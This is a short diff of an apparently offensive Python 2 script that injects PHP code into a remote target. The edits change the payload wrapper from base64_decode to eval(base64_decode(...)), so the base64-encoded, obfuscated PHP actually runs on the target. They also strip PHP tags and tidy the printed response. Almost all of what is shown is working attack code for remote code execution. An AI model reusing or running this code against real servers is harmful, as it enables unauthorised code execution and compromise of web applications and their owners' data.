@@ -6,12 +6,12 @@ import requests
 
 def php_encoder(php):
     f = open(php, "r").read()
-    f = f.replace("<?php", "echo 'Starting execution...';")
-    f = f.replace("?>", "echo 'Done!;")
+    f = f.replace("<?php", "")
+    f = f.replace("?>", "")
     encoded = f.encode('base64')
     encoded = encoded.replace("\n", "")
     encoded = encoded.strip()
-    code = "base64_decode('%s');" %(encoded)
+    code = "eval(base64_decode('%s'));" %(encoded)
     return code
 
 def execute_php(target, trigger_string, code):
@@ -22,7 +22,7 @@ def execute_php(target, trigger_string, code):
 	except Exception, e:
 		sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
 	if r.text:
-		print r.text
+		print r.text.strip()
 
 def main(args):
     if len(args) != 4:
